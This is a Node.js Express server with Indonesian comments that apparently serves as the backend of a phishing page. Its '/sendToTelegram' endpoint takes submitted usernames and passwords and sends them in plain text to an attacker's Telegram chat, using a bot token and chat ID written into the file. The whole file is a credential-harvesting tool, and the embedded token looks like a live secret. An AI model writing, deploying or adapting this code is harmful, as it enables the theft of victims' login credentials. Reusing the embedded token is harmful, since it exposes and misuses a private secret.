import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const port = process.env.PORT || 3000;

// Mendapatkan __dirname dalam ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const TELEGRAM_BOT_TOKEN = '7256410617:AAE7jSC5Yy7yuP1ayTyjQU7drKYTfsnLC-A';
const TELEGRAM_CHAT_ID = '5046106367';

// Middleware
app.use(cors()); // Mengizinkan permintaan dari domain lain
app.use(bodyParser.json()); // Menguraikan body request sebagai JSON

// Melayani file statis dari direktori 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html')); // Mengirimkan file index.html
});

// Endpoint untuk mengirim data ke Telegram
app.post('/sendToTelegram', async (req, res) => {
    console.log('Request body:', req.body); // Log body permintaan

    const { username, password } = req.body;

    if (!username || !password) {
        console.error('Missing username or password'); // Log jika data hilang
        return res.status(400).send('Missing username or password');
    }

    const message = `Username/Email: ${username}\nPassword: ${password}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

    try {
        console.log('Sending request to Telegram:', url); // Log URL permintaan
        const response = await fetch(url);
        const data = await response.json();

        console.log('Telegram response:', data); // Log respons dari Telegram
        if (data.ok) {
            res.status(200).send('Message sent!');
        } else {
            res.status(500).send('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error); // Log error jika ada masalah
        res.status(500).send('Error: ' + error.message);
    }
});

// Mulai server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
